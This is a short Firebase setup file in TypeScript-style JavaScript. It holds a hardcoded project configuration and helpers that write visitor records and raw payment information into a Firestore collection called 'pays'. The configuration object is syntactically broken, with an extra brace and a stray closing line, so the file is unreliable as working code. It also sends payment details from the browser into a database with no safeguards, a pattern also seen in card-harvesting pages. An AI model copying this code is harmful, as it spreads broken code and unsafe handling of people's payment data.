// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getFirestore, setDoc } from "firebase/firestore";

const firebaseConfig = {
{
  apiKey: "AIzaSyDKv0L5VjPP7oD12Cwk6zA15-GGBpY-tPs",
  authDomain: "mmdm-6fb93.firebaseapp.com",
  projectId: "mmdm-6fb93",
  storageBucket: "mmdm-6fb93.firebasestorage.app",
  messagingSenderId: "657145391802",
  appId: "1:657145391802:web:aa2ef55a0b9d41d9e17083",
  measurementId: "G-8J5VLQMT5P"};
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(docRef, data, { merge: true });

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, createdDate: new Date().toISOString() },
        { merge: true }
      );
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export { db, database };
